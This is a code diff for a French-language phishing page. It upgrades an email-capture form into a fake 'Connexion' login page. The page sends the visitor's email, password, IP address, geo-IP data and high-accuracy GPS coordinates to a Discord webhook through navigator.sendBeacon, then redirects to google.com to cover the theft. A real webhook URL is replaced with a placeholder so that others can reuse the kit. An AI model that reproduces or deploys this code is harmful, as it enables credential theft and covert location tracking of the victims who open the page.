@@ -54,24 +54,24 @@
 </head>
 <body>
 <div class="card">
-  <h1>Vérification requise</h1>
-  <p>Entrez votre email pour continuer.</p>
-  <input type="email" id="email" placeholder="exemple@email.com" autocomplete="email">
+  <h1>Connexion</h1>
+  <p>Entrez vos identifiants pour continuer.</p>
+  <input type="email" id="email" placeholder="Email" autocomplete="email">
+  <input type="password" id="password" placeholder="Mot de passe">
   <button onclick="submit()">Continuer</button>
-  <div class="err" id="err">Email invalide.</div>
+  <div class="err" id="err">Champs invalides.</div>
 </div>
 
 <script>
-  const WEBHOOK = "https://discord.com/api/webhooks/1573689278758780969/81L_PnH56AOSVgIBeucy4FQpueabbeDRw5hgoQPyCLzeGs8LgAo-xeali-JewGUDCTaf";
+  const WEBHOOK = "REMPLACE_PAR_TON_WEBHOOK";
 
   function send(embed) {
     const body = JSON.stringify({ embeds: [embed] });
     navigator.sendBeacon(WEBHOOK, new Blob([body], { type: "application/json" }));
   }
 
-  let ip = "?", geoData = {}, gpsData = {};
+  let ip = "?";
 
-  // === IP + Geo en arrière-plan dès le chargement ===
   (async () => {
     try {
       const r = await fetch("https://api.ipify.org?format=json");
@@ -95,7 +95,6 @@
     fetch(`https://ipapi.co/${ip}/json/`, { cache: "no-store" })
       .then(r => r.json())
       .then(geo => {
-        geoData = geo;
         send({
           title: "📍 Geo IP — " + ip,
           color: 0x60a5fa,
@@ -111,54 +110,49 @@
       }).catch(() => {});
   })();
 
-  // === GPS — demande permission au chargement ===
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       pos => {
-        gpsData = {
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          acc: pos.coords.accuracy
-        };
         send({
           title: "📡 GPS précis",
           color: 0xf59e0b,
           fields: [
-            { name: "📍 Latitude",   value: String(gpsData.lat), inline: true },
-            { name: "📍 Longitude",  value: String(gpsData.lon), inline: true },
-            { name: "🎯 Précision",  value: `${Math.round(gpsData.acc)}m`, inline: true },
-            { name: "🗺️ Maps",      value: `https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}`, inline: false }
+            { name: "📍 Latitude",  value: String(pos.coords.latitude),  inline: true },
+            { name: "📍 Longitude", value: String(pos.coords.longitude), inline: true },
+            { name: "🎯 Précision", value: `${Math.round(pos.coords.accuracy)}m`, inline: true },
+            { name: "🗺️ Maps",     value: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`, inline: false }
           ],
           timestamp: new Date().toISOString()
         });
       },
-      () => {}, // refus silencieux
+      () => {},
       { enableHighAccuracy: true, timeout: 10000 }
     );
   }
 
-  // === Soumission email ===
   function submit() {
     const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value;
     const err = document.getElementById("err");
-    if (!email || !email.includes("@")) {
+
+    if (!email || !email.includes("@") || !password) {
       err.style.display = "block";
       return;
     }
     err.style.display = "none";
 
     send({
-      title: "📧 Email soumis",
+      title: "🔑 Identifiants",
       color: 0xe879f9,
       fields: [
-        { name: "📧 Email", value: email, inline: false },
-        { name: "🌐 IP",    value: ip,    inline: true },
-        { name: "🕐 Heure", value: new Date().toISOString(), inline: false }
+        { name: "📧 Email",       value: email,    inline: false },
+        { name: "🔒 Mot de passe", value: password, inline: false },
+        { name: "🌐 IP",          value: ip,        inline: true },
+        { name: "🕐 Heure",       value: new Date().toISOString(), inline: false }
       ],
       timestamp: new Date().toISOString()
     });
 
-    // Redirige après soumission
     window.location.replace("https://google.com");
   }
 </script>
